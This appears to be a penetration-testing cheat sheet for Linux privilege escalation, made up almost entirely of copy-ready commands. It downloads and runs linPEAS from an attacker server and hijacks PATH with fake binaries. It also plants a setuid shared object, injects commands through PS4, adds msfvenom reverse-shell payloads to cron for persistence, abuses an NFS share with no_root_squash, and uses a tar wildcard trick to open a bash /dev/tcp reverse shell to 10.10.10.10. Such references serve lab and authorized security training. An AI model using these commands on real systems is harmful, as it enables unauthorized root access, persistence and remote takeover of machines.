# Linux Privilege Escalation
Easy and fast priv escalation

## Python Server

```bash copy
cd /home/kali/scripts && sudo python3 -m http.server 80
```
- Starts an HTTP server on port 80 for file sharing.
- `-m http.server 80`: Runs Python HTTP server on port 80

## Privilege Escalation aio script

```bash copy
cd /tmp; wget http://10.10.10.10:1234/linPEAS.sh
chmod +x linPEAS.sh
./linPEAS.sh
```
- Downloads and runs linPEAS script for privilege escalation.

## Privilege Escalation

- **Checklist**: [PayloadsAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- **Checklist**: [HackTricks - Linux Privilege Escalation Checklist](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
- **SUID files list**: [GTFOBins](https://gtfobins.github.io/)
- **Kernel Exploit**: [Linux Exploit Suggester](https://github.com/jondonas/linux-exploit-suggester-2)

### List sudo permissions
```bash copy
sudo -l
```
- Lists commands user can run with sudo.
- `-l`: List allowed commands.

### SUID
```bash copy
find / -perm -u=s -type f 2>/dev/null
```
- Finds SUID files owned by root.
- `-perm -u=s`: SUID bit set
- `-type f`: Files only
- `2>/dev/null`: Suppresses permission errors.

```bash copy
find / -user root -perm -4000 -exec ls -ldb {} \;
```
- Lists root-owned SUID files with details.
- `-user root`: Root-owned
- `-perm -4000`: SUID bit
- `-exec ls -ldb`: Detailed listing.

```bash copy
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
- Finds SUID or SGID files with detailed listing.
- `-type f`: Files
- `-perm -u+s -o -perm -g+s`: SUID or SGID
- `-exec ls -l`: Detailed output.

### Capabilities
```bash copy
getcap -r / 2>/dev/null
```
- Lists files with Linux capabilities across the filesystem.
- `-r`: Recursive scan of directories.
- `2>/dev/null`: Suppresses permission-denied error messages.

### PATH Manipulation
```bash copy
cd /tmp
echo /bin/sh > ps
chmod +x ps
export PATH=/tmp:$PATH
```
- Creates fake `ps` to run shell via PATH hijacking.
- `chmod +x`: Makes executable
- `export PATH=/tmp:$PATH`: Prepends /tmp to PATH.

```bash copy
cd /tmp
echo echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
```
- Creates fake `ls` to run bash via PATH hijacking.
- `chmod +x`: Makes executable
- `export PATH=/tmp:$PATH`: Prepends /tmp to PATH.

### Vim Editor escalation
```bash copy
sudo -l
/usr/bin/vi
:!sh
:quit
```
- Escalates to shell from vim if run with sudo.
- `:!sh`: Runs shell
- `:quit`: Exits vim.

### Shared Object
```bash copy
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
- Traces file access errors for suid-so binary.
- `2>&1`: Redirects stderr to stdout
- `grep -iE "open|access|no such file"`: Filters for file errors.


```C copy
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```
- `service.c` Program code.

```bash copy
mkdir /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/service.c
/usr/local/bin/suid-so
```
- Compiles and runs malicious shared object for escalation.
- `-shared -fPIC`: Creates position-independent shared object.

### Environment Variables
```bash copy
strings /usr/local/bin/suid-env
gcc -o service /home/user/tools/suid/service.c
PATH=.:$PATH /usr/local/bin/suid-env
```
- Hijacks environment variables to run malicious service binary.
- `PATH=.:$PATH`: Prepends current directory to PATH.

### Abuse shell features (bash <4.2-048)
```bash copy
strings /usr/local/bin/suid-env2
/bin/bash --version
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```
- Creates bash function to escalate via service command (bash <4.2-048).
- `-p`: Preserves privileges
- `export -f`: Exports function.
### Bash debugging escalation (bash <4.4)

```bash copy
/bin/bash --version
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)'
/usr/local/bin/suid-env2
/tmp/rootbash -p
```
- Uses bash debugging to create SUID bash (bash <4.4).
- `SHELLOPTS=xtrace`: Enables debug
- `PS4='...'`: Executes command during debug
- `-p`: Privileged mode.

### Reverse Shell (msfvenom & crontab)
```bash copy
msfvenom -p cmd/unix/reverse_netcat lhost=10.10.10.10 lport=1234 R
```
- Generates reverse shell payload connecting to attacker.
- `-p cmd/unix/reverse_netcat`: Payload type
- `lhost=10.10.10.10`: Attacker IP
- `lport=1234`: Attacker port
- `R`: Raw output.

```bash copy
cat /etc/crontab
echo [MSFVENOM OUTPUT] > autoscript.sh
```
- Adds msfvenom payload to cron for persistence.

### NFS Misconfiguration
```bash copy
cat /etc/exports
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```
- Mounts NFS share with no_root_squash for escalation.
- `-o rw,vers=3`: Read/write
- NFS version 3.

```bash copy
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
/tmp/shell.elf
```
- Creates and runs SUID shell via NFS.
- `-p linux/x86/exec`: Payload
- `CMD="/bin/bash -p"`: Privileged bash
- `-f elf`: ELF format
- `chmod +xs`: Sets SUID.

### Tar Wildcard
```bash copy
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'" > shell.sh
chmod +x shell.sh
chmod 777 shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" >> --checkpoint=1
```
- Exploits tar wildcard to run reverse shell.
- `chmod +x`: Makes executable
- `chmod 777`: Full permissions
- `--checkpoint-action=exec=sh shell.sh`: Executes shell.sh.

### Backup Script
```bash copy
chmod o+wx backup.sh
sudo -u michael /opt/backups/backup.sh
```
- Exploits writable backup script for escalation.
- `o+wx`: Adds write/execute for others.

### SUID Bash
```bash copy
./.suid_bash -p
```
- Runs SUID bash for privilege escalation.
- `-p`: Preserves privileges.

